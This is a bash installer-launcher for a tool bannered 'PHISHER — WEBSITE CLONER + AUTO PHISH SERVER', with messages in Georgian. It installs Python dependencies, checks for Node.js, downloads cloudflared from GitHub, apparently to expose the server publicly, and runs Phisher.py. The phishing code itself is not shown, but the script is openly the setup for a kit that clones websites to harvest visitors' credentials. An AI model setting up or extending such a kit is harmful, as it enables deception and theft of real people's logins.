#!/bin/bash
echo
echo " ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ "
echo " ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗"
echo " ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝"
echo " ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗"
echo " ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║"
echo " ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝"
echo
echo "           WEBSITE CLONER + AUTO PHISH SERVER"
echo "                     -ALEQSEI"
echo

echo "[+] Python ბიბლიოთეკები..."
pip3 install -r requirements.txt --user

echo "[+] Node.js შემოწმება..."
if ! command -v node &> /dev/null; then
    echo "[!] Node.js არ არის! დააინსტალირე: https://nodejs.org"
    exit 1
fi

echo "[+] cloudflared ჩამოტვირთვა..."
if [ ! -f cloudflared ]; then
    curl -L -o cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
    chmod +x cloudflared
fi

echo
echo "[+] გაშვება..."
python3 Phisher.py